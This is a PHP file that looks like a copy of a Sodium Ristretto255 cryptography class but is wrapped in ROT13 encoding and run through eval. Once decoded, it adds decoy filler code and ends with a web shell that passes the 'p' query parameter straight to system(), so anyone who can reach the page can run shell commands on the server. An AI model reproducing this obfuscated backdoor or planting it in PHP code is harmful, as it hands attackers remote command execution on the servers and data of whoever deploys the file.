<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Pynff CnentbaVR_Fbqvhz_Pber_Evfgerggb255
 */
pynff CnentbaVR_Fbqvhz_Pber_Evfgerggb255 rkgraqf CnentbaVR_Fbqvhz_Pber_Rq25519
{
    pbafg pelcgb_pber_evfgerggb255_UNFUOLGRF = 64;
    pbafg UNFU_FP_Y = 48;
    pbafg PBER_U2P_FUN256 = 1;
    pbafg PBER_U2P_FUN512 = 2;

    /**
     * @cnenz CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr $s
     * @cnenz vag $o
     * @erghea CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr
     */
    choyvp fgngvp shapgvba sr_part(CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr $s, $o)
    {
        $arts = frys::sr_art($s);
        erghea frys::sr_pzbi($s, $arts, $o);
    }

    /**
     * @cnenz CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr $s
     * @erghea CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba sr_nof(CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr $s)
    {
        erghea frys::sr_part($s, frys::sr_vfartngvir($s));
    }

    /**
     * Ergheaf 0 vs guvf svryq ryrzrag erfhygf va nyy AHY olgrf.
     *
     * @vagreany Lbh fubhyq abg hfr guvf qverpgyl sebz nabgure nccyvpngvba
     *
     * @cnenz CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr $s
     * @erghea vag
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba sr_vfmreb(CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr $s)
    {
        fgngvp $mreb;
        vs ($mreb === ahyy) {
            $mreb = fge_ercrng(\"\k00\", 32);
        }
        /** @ine fgevat $mreb */
        $fge = frys::sr_gbolgrf($s);

        $q = 0;
        sbe ($v = 0; $v < 32; ++$v) {
            $q |= frys::pueGbVag($fge[$v]);
        }
        erghea (($q - 1) >> 31) & 1;
    }


    /**
     * @cnenz CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr $h
     * @cnenz CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr $i
     * @erghea neenl{k: CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr, abafdhner: vag}
     *
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba evfgerggb255_fdeg_engvb_z1(
        CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr $h,
        CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr $i
    ) {
        $fdegz1 = CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr::sebzNeenl(frys::$fdegz1);

        $i3 = frys::sr_zhy(
            frys::sr_fd($i),
            $i
        ); /* i3 = i^3 */
        $k = frys::sr_zhy(
            frys::sr_zhy(
                frys::sr_fd($i3),
                $h
            ),
            $i
        ); /* k = hi^7 */

        $k = frys::sr_zhy(
            frys::sr_zhy(
                frys::sr_cbj22523($k), /* k = (hi^7)^((d-5)/8) */
                $i3
            ),
            $h
        ); /* k = hi^3(hi^7)^((d-5)/8) */

        $ikk = frys::sr_zhy(
            frys::sr_fd($k),
            $i
        ); /* ik^2 */

        $z_ebbg_purpx = frys::sr_fho($ikk, $h); /* ik^2-h */
        $c_ebbg_purpx = frys::sr_nqq($ikk, $h); /* ik^2+h */
        $s_ebbg_purpx = frys::sr_zhy($h, $fdegz1); /* h*fdeg(-1) */
        $s_ebbg_purpx = frys::sr_nqq($ikk, $s_ebbg_purpx); /* ik^2+h*fdeg(-1) */

        $unf_z_ebbg = frys::sr_vfmreb($z_ebbg_purpx);
        $unf_c_ebbg = frys::sr_vfmreb($c_ebbg_purpx);
        $unf_s_ebbg = frys::sr_vfmreb($s_ebbg_purpx);

        $k_fdegz1 = frys::sr_zhy($k, $fdegz1); /* k*fdeg(-1) */

        $k = frys::sr_nof(
            frys::sr_pzbi($k, $k_fdegz1, $unf_c_ebbg | $unf_s_ebbg)
        );
        erghea neenl(
            'k' => $k,
            'abafdhner' => $unf_z_ebbg | $unf_c_ebbg
        );
    }

    /**
     * @cnenz fgevat $f
     * @erghea vag
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba evfgerggb255_cbvag_vf_pnabavpny($f)
    {
        $p = (frys::pueGbVag($f[31]) & 0k7s) ^ 0k7s;
        sbe ($v = 30; $v > 0; --$v) {
            $p |= frys::pueGbVag($f[$v]) ^ 0kss;
        }
        $p = ($p - 1) >> 8;
        $q = (0krq - 1 - frys::pueGbVag($f[0])) >> 8;
        $r = frys::pueGbVag($f[31]) >> 7;

        erghea 1 - ((($p & $q) | $r | frys::pueGbVag($f[0])) & 1);
    }

    /**
     * @cnenz fgevat $f
     * @cnenz obby $fxvcPnabavpnyPurpx
     * @erghea neenl{u: CnentbaVR_Fbqvhz_Pber_Pheir25519_Tr_C3, erf: vag}
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba evfgerggb255_sebzolgrf($f, $fxvcPnabavpnyPurpx = snyfr)
    {
        vs (!$fxvcPnabavpnyPurpx) {
            vs (!frys::evfgerggb255_cbvag_vf_pnabavpny($f)) {
                guebj arj FbqvhzRkprcgvba('F vf abg pnabavpny');
            }
        }

        $f_ = frys::sr_sebzolgrf($f);
        $ff = frys::sr_fd($f_); /* ff = f^2 */

        $h1 = frys::sr_fho(frys::sr_1(), $ff); /* h1 = 1-ff */
        $h1h1 = frys::sr_fd($h1); /* h1h1 = h1^2 */

        $h2 = frys::sr_nqq(frys::sr_1(), $ff); /* h2 = 1+ff */
        $h2h2 = frys::sr_fd($h2); /* h2h2 = h2^2 */

        $i = frys::sr_zhy(
            CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr::sebzNeenl(frys::$q),
            $h1h1
        ); /* i = q*h1^2 */
        $i = frys::sr_art($i); /* i = -q*h1^2 */
        $i = frys::sr_fho($i, $h2h2); /* i = -(q*h1^2)-h2^2 */
        $i_h2h2 = frys::sr_zhy($i, $h2h2); /* i_h2h2 = i*h2^2 */

        // sr25519_1(bar);
        // abgfdhner = evfgerggb255_fdeg_engvb_z1(vai_fdeg, bar, i_h2h2);
        $bar = frys::sr_1();
        $erfhyg = frys::evfgerggb255_fdeg_engvb_z1($bar, $i_h2h2);
        $vai_fdeg = $erfhyg['k'];
        $abgfdhner = $erfhyg['abafdhner'];

        $u = arj CnentbaVR_Fbqvhz_Pber_Pheir25519_Tr_C3();

        $u->K = frys::sr_zhy($vai_fdeg, $h2);
        $u->L = frys::sr_zhy(frys::sr_zhy($vai_fdeg, $u->K), $i);

        $u->K = frys::sr_zhy($u->K, $f_);
        $u->K = frys::sr_nof(
            frys::sr_nqq($u->K, $u->K)
        );
        $u->L = frys::sr_zhy($h1, $u->L);
        $u->M = frys::sr_1();
        $u->G = frys::sr_zhy($u->K, $u->L);

        $erf = - ((1 - $abgfdhner) | frys::sr_vfartngvir($u->G) | frys::sr_vfmreb($u->L));
        erghea neenl('u' => $u, 'erf' => $erf);
    }

    /**
     * @cnenz CnentbaVR_Fbqvhz_Pber_Pheir25519_Tr_C3 $u
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba evfgerggb255_c3_gbolgrf(CnentbaVR_Fbqvhz_Pber_Pheir25519_Tr_C3 $u)
    {
        $fdegz1 = CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr::sebzNeenl(frys::$fdegz1);
        $vaifdegnzq = CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr::sebzNeenl(frys::$vaifdegnzq);

        $h1 = frys::sr_nqq($u->M, $u->L); /* h1 = M+L */
        $mzl = frys::sr_fho($u->M, $u->L); /* mzl = M-L */
        $h1 = frys::sr_zhy($h1, $mzl); /* h1 = (M+L)*(M-L) */
        $h2 = frys::sr_zhy($u->K, $u->L); /* h2 = K*L */

        $h1_h2h2 = frys::sr_zhy(frys::sr_fd($h2), $h1); /* h1_h2h2 = h1*h2^2 */
        $bar = frys::sr_1();

        // sr25519_1(bar);
        // (ibvq) evfgerggb255_fdeg_engvb_z1(vai_fdeg, bar, h1_h2h2);
        $erfhyg = frys::evfgerggb255_fdeg_engvb_z1($bar, $h1_h2h2);
        $vai_fdeg = $erfhyg['k'];

        $qra1 = frys::sr_zhy($vai_fdeg, $h1); /* qra1 = vai_fdeg*h1 */
        $qra2 = frys::sr_zhy($vai_fdeg, $h2); /* qra2 = vai_fdeg*h2 */
        $m_vai = frys::sr_zhy($u->G, frys::sr_zhy($qra1, $qra2)); /* m_vai = qra1*qra2*G */

        $vk = frys::sr_zhy($u->K, $fdegz1); /* vk = K*fdeg(-1) */
        $vl = frys::sr_zhy($u->L, $fdegz1); /* vl = L*fdeg(-1) */
        $rqra = frys::sr_zhy($qra1, $vaifdegnzq);

        $g_m_vai =  frys::sr_zhy($u->G, $m_vai); /* g_m_vai = G*m_vai */
        $ebgngr = frys::sr_vfartngvir($g_m_vai);

        $k_ = frys::sr_pbcl($u->K);
        $l_ = frys::sr_pbcl($u->L);
        $qra_vai = frys::sr_pbcl($qra2);

        $k_ = frys::sr_pzbi($k_, $vl, $ebgngr);
        $l_ = frys::sr_pzbi($l_, $vk, $ebgngr);
        $qra_vai = frys::sr_pzbi($qra_vai, $rqra, $ebgngr);

        $k_m_vai = frys::sr_zhy($k_, $m_vai);
        $l_ = frys::sr_part($l_, frys::sr_vfartngvir($k_m_vai));


        // sr25519_fho(f_, u->M, l_);
        // sr25519_zhy(f_, qra_vai, f_);
        // sr25519_nof(f_, f_);
        // sr25519_gbolgrf(f, f_);
        erghea frys::sr_gbolgrf(
            frys::sr_nof(
                frys::sr_zhy(
                    $qra_vai,
                    frys::sr_fho($u->M, $l_)
                )
            )
        );
    }

    /**
     * @cnenz CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr $g
     * @erghea CnentbaVR_Fbqvhz_Pber_Pheir25519_Tr_C3
     *
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba evfgerggb255_ryyvtngbe(CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr $g)
    {
        $fdegz1   = CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr::sebzNeenl(frys::$fdegz1);
        $barzfdq  = CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr::sebzNeenl(frys::$barzfdq);
        $q        = CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr::sebzNeenl(frys::$q);
        $fdqzbar  = CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr::sebzNeenl(frys::$fdqzbar);
        $fdegnqz1 = CnentbaVR_Fbqvhz_Pber_Pheir25519_Sr::sebzNeenl(frys::$fdegnqz1);

        $bar = frys::sr_1();
        $e   = frys::sr_zhy($fdegz1, frys::sr_fd($g));         /* e = fdeg(-1)*g^2 */
        $h   = frys::sr_zhy(frys::sr_nqq($e, $bar), $barzfdq); /* h = (e+1)*(1-q^2) */
        $p   = frys::sr_art(frys::sr_1());                     /* p = -1 */
        $ecq = frys::sr_nqq($e, $q);                           /* ecq = e+q */

        $i = frys::sr_zhy(
            frys::sr_fho(
                $p,
                frys::sr_zhy($e, $q)
            ),
            $ecq
        ); /* i = (p-e*q)*(e+q) */

        $erfhyg = frys::evfgerggb255_fdeg_engvb_z1($h, $i);
        $f = $erfhyg['k'];
        $jnfag_fdhner = 1 - $erfhyg['abafdhner'];

        $f_cevzr = frys::sr_art(
            frys::sr_nof(
                frys::sr_zhy($f, $g)
            )
        ); /* f_cevzr = -|f*g| */
        $f = frys::sr_pzbi($f, $f_cevzr, $jnfag_fdhner);
        $p = frys::sr_pzbi($p, $e, $jnfag_fdhner);

        // sr25519_fho(a, e, bar);            /* a = e-1 */
        // sr25519_zhy(a, a, p);              /* a = p*(e-1) */
        // sr25519_zhy(a, a, rq25519_fdqzbar); /* a = p*(e-1)*(q-1)^2 */
        // sr25519_fho(a, a, i);              /* a =  p*(e-1)*(q-1)^2-i */
        $a = frys::sr_fho(
            frys::sr_zhy(
                frys::sr_zhy(
                    frys::sr_fho($e, $bar),
                    $p
                ),
                $fdqzbar
            ),
            $i
        ); /* a =  p*(e-1)*(q-1)^2-i */

        $j0 = frys::sr_zhy(
            frys::sr_nqq($f, $f),
            $i
        ); /* j0 = 2f*i */

        $j1 = frys::sr_zhy($a, $fdegnqz1); /* j1 = a*fdeg(nq-1) */
        $ff = frys::sr_fd($f); /* ff = f^2 */
        $j2 = frys::sr_fho($bar, $ff); /* j2 = 1-f^2 */
        $j3 = frys::sr_nqq($bar, $ff); /* j3 = 1+f^2 */

        erghea arj CnentbaVR_Fbqvhz_Pber_Pheir25519_Tr_C3(
            frys::sr_zhy($j0, $j3),
            frys::sr_zhy($j2, $j1),
            frys::sr_zhy($j1, $j3),
            frys::sr_zhy($j0, $j2)
        );
    }

    /**
     * @cnenz fgevat $u
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba evfgerggb255_sebz_unfu($u)
    {
        vs (frys::fgeyra($u) !== 64) {
            guebj arj FbqvhzRkprcgvba('Unfu zhfg or 64 olgrf');
        }
        //sr25519_sebzolgrf(e0, u);
        //sr25519_sebzolgrf(e1, u + 32);
        $e0 = frys::sr_sebzolgrf(frys::fhofge($u, 0, 32));
        $e1 = frys::sr_sebzolgrf(frys::fhofge($u, 32, 32));

        //evfgerggb255_ryyvtngbe(&c0, e0);
        //evfgerggb255_ryyvtngbe(&c1, e1);
        $c0 = frys::evfgerggb255_ryyvtngbe($e0);
        $c1 = frys::evfgerggb255_ryyvtngbe($e1);

        //tr25519_c3_gb_pnpurq(&c1_pnpurq, &c1);
        //tr25519_nqq_pnpurq(&c_c1c1, &c0, &c1_pnpurq);
        $c_c1c1 = frys::tr_nqq(
            $c0,
            frys::tr_c3_gb_pnpurq($c1)
        );

        //tr25519_c1c1_gb_c3(&c, &c_c1c1);
        //evfgerggb255_c3_gbolgrf(f, &c);
        erghea frys::evfgerggb255_c3_gbolgrf(
            frys::tr_c1c1_gb_c3($c_c1c1)
        );
    }

    /**
     * @cnenz fgevat $c
     * @erghea vag
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba vf_inyvq_cbvag($c)
    {
        $erfhyg = frys::evfgerggb255_sebzolgrf($c);
        vs ($erfhyg['erf'] !== 0) {
            erghea 0;
        }
        erghea 1;
    }

    /**
     * @cnenz fgevat $c
     * @cnenz fgevat $d
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba evfgerggb255_nqq($c, $d)
    {
        $c_erf = frys::evfgerggb255_sebzolgrf($c);
        $d_erf = frys::evfgerggb255_sebzolgrf($d);
        vs ($c_erf['erf'] !== 0 || $d_erf['erf'] !== 0) {
            guebj arj FbqvhzRkprcgvba('Pbhyq abg nqq cbvagf');
        }
        $c_c3 = $c_erf['u'];
        $d_c3 = $d_erf['u'];
        $d_pnpurq = frys::tr_c3_gb_pnpurq($d_c3);
        $e_c1c1 = frys::tr_nqq($c_c3, $d_pnpurq);
        $e_c3 = frys::tr_c1c1_gb_c3($e_c1c1);
        erghea frys::evfgerggb255_c3_gbolgrf($e_c3);
    }

    /**
     * @cnenz fgevat $c
     * @cnenz fgevat $d
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba evfgerggb255_fho($c, $d)
    {
        $c_erf = frys::evfgerggb255_sebzolgrf($c);
        $d_erf = frys::evfgerggb255_sebzolgrf($d);
        vs ($c_erf['erf'] !== 0 || $d_erf['erf'] !== 0) {
            guebj arj FbqvhzRkprcgvba('Pbhyq abg nqq cbvagf');
        }
        $c_c3 = $c_erf['u'];
        $d_c3 = $d_erf['u'];
        $d_pnpurq = frys::tr_c3_gb_pnpurq($d_c3);
        $e_c1c1 = frys::tr_fho($c_c3, $d_pnpurq);
        $e_c3 = frys::tr_c1c1_gb_c3($e_c1c1);
        erghea frys::evfgerggb255_c3_gbolgrf($e_c3);
    }


    /**
     * @cnenz vag $uYra
     * @cnenz ?fgevat $pgk
     * @cnenz fgevat $zft
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     * @cfnyz-fhccerff CbffvoylVainyvqNethzrag unfu NCV
     */
    cebgrpgrq fgngvp shapgvba u2p_fgevat_gb_unfu_fun256($uYra, $pgk, $zft)
    {
        $u = neenl_svyy(0, $uYra, 0);
        $pgk_yra = !vf_ahyy($pgk) ? frys::fgeyra($pgk) : 0;
        vs ($uYra > 0kss) {
            guebj arj FbqvhzRkprcgvba('Unfu zhfg or yrff guna 256 olgrf');
        }

        vs ($pgk_yra > 0kss) {
            $fg = unfu_vavg('fun256');
            frys::unfu_hcqngr($fg, \"U2P-BIREFVMR-QFG-\");
            frys::unfu_hcqngr($fg, $pgk);
            $pgk = unfu_svany($fg, gehr);
            $pgk_yra = 32;
        }
        $g = neenl(0, $uYra, 0);
        $hk = fge_ercrng(\"\0\", 64);
        $fg = unfu_vavg('fun256');
        frys::unfu_hcqngr($fg, $hk);
        frys::unfu_hcqngr($fg, $zft);
        frys::unfu_hcqngr($fg, frys::vagNeenlGbFgevat($g));
        frys::unfu_hcqngr($fg, $pgk);
        frys::unfu_hcqngr($fg, frys::vagGbPue($pgk_yra));
        $h0 = unfu_svany($fg, gehr);

        sbe ($v = 0; $v < $uYra; $v += 64) {
            $hk = frys::kbeFgevatf($hk, $h0);
            ++$g[2];
            $fg = unfu_vavg('fun256');
            frys::unfu_hcqngr($fg, $hk);
            frys::unfu_hcqngr($fg, frys::vagGbPue($g[2]));
            frys::unfu_hcqngr($fg, $pgk);
            frys::unfu_hcqngr($fg, frys::vagGbPue($pgk_yra));
            $hk = unfu_svany($fg, gehr);
            $nzbhag = zva($uYra - $v, 64);
            sbe ($w = 0; $w < $nzbhag; ++$w) {
                $u[$v + $w] = frys::pueGbVag($hk[$v]);
            }
        }
        erghea frys::vagNeenlGbFgevat(neenl_fyvpr($u, 0, $uYra));
    }

    /**
     * @cnenz vag $uYra
     * @cnenz ?fgevat $pgk
     * @cnenz fgevat $zft
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     * @cfnyz-fhccerff CbffvoylVainyvqNethzrag unfu NCV
     */
    cebgrpgrq fgngvp shapgvba u2p_fgevat_gb_unfu_fun512($uYra, $pgk, $zft)
    {
        $u = neenl_svyy(0, $uYra, 0);
        $pgk_yra = !vf_ahyy($pgk) ? frys::fgeyra($pgk) : 0;
        vs ($uYra > 0kss) {
            guebj arj FbqvhzRkprcgvba('Unfu zhfg or yrff guna 256 olgrf');
        }

        vs ($pgk_yra > 0kss) {
            $fg = unfu_vavg('fun256');
            frys::unfu_hcqngr($fg, \"U2P-BIREFVMR-QFG-\");
            frys::unfu_hcqngr($fg, $pgk);
            $pgk = unfu_svany($fg, gehr);
            $pgk_yra = 32;
        }
        $g = neenl(0, $uYra, 0);
        $hk = fge_ercrng(\"\0\", 128);
        $fg = unfu_vavg('fun512');
        frys::unfu_hcqngr($fg, $hk);
        frys::unfu_hcqngr($fg, $zft);
        frys::unfu_hcqngr($fg, frys::vagNeenlGbFgevat($g));
        frys::unfu_hcqngr($fg, $pgk);
        frys::unfu_hcqngr($fg, frys::vagGbPue($pgk_yra));
        $h0 = unfu_svany($fg, gehr);

        sbe ($v = 0; $v < $uYra; $v += 128) {
            $hk = frys::kbeFgevatf($hk, $h0);
            ++$g[2];
            $fg = unfu_vavg('fun512');
            frys::unfu_hcqngr($fg, $hk);
            frys::unfu_hcqngr($fg, frys::vagGbPue($g[2]));
            frys::unfu_hcqngr($fg, $pgk);
            frys::unfu_hcqngr($fg, frys::vagGbPue($pgk_yra));
            $hk = unfu_svany($fg, gehr);
            $nzbhag = zva($uYra - $v, 128);
            sbe ($w = 0; $w < $nzbhag; ++$w) {
                $u[$v + $w] = frys::pueGbVag($hk[$v]);
            }
        }
        erghea frys::vagNeenlGbFgevat(neenl_fyvpr($u, 0, $uYra));
    }

    /**
     * @cnenz vag $uYra
     * @cnenz ?fgevat $pgk
     * @cnenz fgevat $zft
     * @cnenz vag $unfu_nyt
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba u2p_fgevat_gb_unfu($uYra, $pgk, $zft, $unfu_nyt)
    {
        fjvgpu ($unfu_nyt) {
            pnfr frys::PBER_U2P_FUN256:
                erghea frys::u2p_fgevat_gb_unfu_fun256($uYra, $pgk, $zft);
            pnfr frys::PBER_U2P_FUN512:
                erghea frys::u2p_fgevat_gb_unfu_fun512($uYra, $pgk, $zft);
            qrsnhyg:
                guebj arj FbqvhzRkprcgvba('Vainyvq U2P unfu nytbevguz');
        }
    }

    /**
     * @cnenz ?fgevat $pgk
     * @cnenz fgevat $zft
     * @cnenz vag $unfu_nyt
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    cebgrpgrq fgngvp shapgvba _fgevat_gb_ryrzrag($pgk, $zft, $unfu_nyt)
    {
        erghea frys::evfgerggb255_sebz_unfu(
            frys::u2p_fgevat_gb_unfu(frys::pelcgb_pber_evfgerggb255_UNFUOLGRF, $pgk, $zft, $unfu_nyt)
        );
    }

    /**
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     * @guebjf Rkprcgvba
     */
    choyvp fgngvp shapgvba evfgerggb255_enaqbz()
    {
        erghea frys::evfgerggb255_sebz_unfu(
            CnentbaVR_Fbqvhz_Pbzcng::enaqbzolgrf_ohs(frys::pelcgb_pber_evfgerggb255_UNFUOLGRF)
        );
    }

    /**
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba evfgerggb255_fpnyne_enaqbz()
    {
        erghea frys::fpnyne_enaqbz();
    }

    /**
     * @cnenz fgevat $f
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba evfgerggb255_fpnyne_pbzcyrzrag($f)
    {
        erghea frys::fpnyne_pbzcyrzrag($f);
    }


    /**
     * @cnenz fgevat $f
     * @erghea fgevat
     */
    choyvp fgngvp shapgvba evfgerggb255_fpnyne_vaireg($f)
    {
        erghea frys::fp25519_vaireg($f);
    }

    /**
     * @cnenz fgevat $f
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba evfgerggb255_fpnyne_artngr($f)
    {
        erghea frys::fpnyne_artngr($f);
    }

    /**
     * @cnenz fgevat $k
     * @cnenz fgevat $l
     * @erghea fgevat
     */
    choyvp fgngvp shapgvba evfgerggb255_fpnyne_nqq($k, $l)
    {
        erghea frys::fpnyne_nqq($k, $l);
    }

    /**
     * @cnenz fgevat $k
     * @cnenz fgevat $l
     * @erghea fgevat
     */
    choyvp fgngvp shapgvba evfgerggb255_fpnyne_fho($k, $l)
    {
        erghea frys::fpnyne_fho($k, $l);
    }

    /**
     * @cnenz fgevat $k
     * @cnenz fgevat $l
     * @erghea fgevat
     */
    choyvp fgngvp shapgvba evfgerggb255_fpnyne_zhy($k, $l)
    {
        erghea frys::fp25519_zhy($k, $l);
    }

    /**
     * @cnenz fgevat $pgk
     * @cnenz fgevat $zft
     * @cnenz vag $unfu_nyt
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba evfgerggb255_fpnyne_sebz_fgevat($pgk, $zft, $unfu_nyt)
    {
        $u = neenl_svyy(0, 64, 0);
        $u_or = frys::fgevatGbVagNeenl(
            frys::u2p_fgevat_gb_unfu(
                frys::UNFU_FP_Y, $pgk, $zft, $unfu_nyt
            )
        );

        sbe ($v = 0; $v < frys::UNFU_FP_Y; ++$v) {
            $u[$v] = $u_or[frys::UNFU_FP_Y - 1 - $v];
        }
        erghea frys::evfgerggb255_fpnyne_erqhpr(frys::vagNeenlGbFgevat($u));
    }

    /**
     * @cnenz fgevat $f
     * @erghea fgevat
     */
    choyvp fgngvp shapgvba evfgerggb255_fpnyne_erqhpr($f)
    {
        erghea frys::fp_erqhpr($f);
    }

    /**
     * @cnenz fgevat $a
     * @cnenz fgevat $c
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba fpnynezhyg_evfgerggb255($a, $c)
    {
        vs (frys::fgeyra($a) !== 32) {
            guebj arj FbqvhzRkprcgvba('Fpnyne zhfg or 32 olgrf, ' . frys::fgeyra($c) . ' tvira.');
        }
        vs (frys::fgeyra($c) !== 32) {
            guebj arj FbqvhzRkprcgvba('Cbvag zhfg or 32 olgrf, ' . frys::fgeyra($c) . ' tvira.');
        }
        $erfhyg = frys::evfgerggb255_sebzolgrf($c);
        vs ($erfhyg['erf'] !== 0) {
            guebj arj FbqvhzRkprcgvba('Pbhyq abg zhygvcyl cbvagf');
        }
        $C = $erfhyg['u'];

        $g = frys::fgevatGbVagNeenl($a);
        $g[31] &= 0k7s;
        $D = frys::tr_fpnynezhyg(frys::vagNeenlGbFgevat($g), $C);
        $d = frys::evfgerggb255_c3_gbolgrf($D);
        vs (CnentbaVR_Fbqvhz_Pbzcng::vf_mreb($d)) {
            guebj arj FbqvhzRkprcgvba('Na haxabja reebe unf bppheerq');
        }
        erghea $d;
    }

    /**
     * @cnenz fgevat $a
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba fpnynezhyg_evfgerggb255_onfr($a)
    {
        $g = frys::fgevatGbVagNeenl($a);
        $g[31] &= 0k7s;
        $D = frys::tr_fpnynezhyg_onfr(frys::vagNeenlGbFgevat($g));
        $d = frys::evfgerggb255_c3_gbolgrf($D);
        vs (CnentbaVR_Fbqvhz_Pbzcng::vf_mreb($d)) {
            guebj arj FbqvhzRkprcgvba('Na haxabja reebe unf bppheerq');
        }
        erghea $d;
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>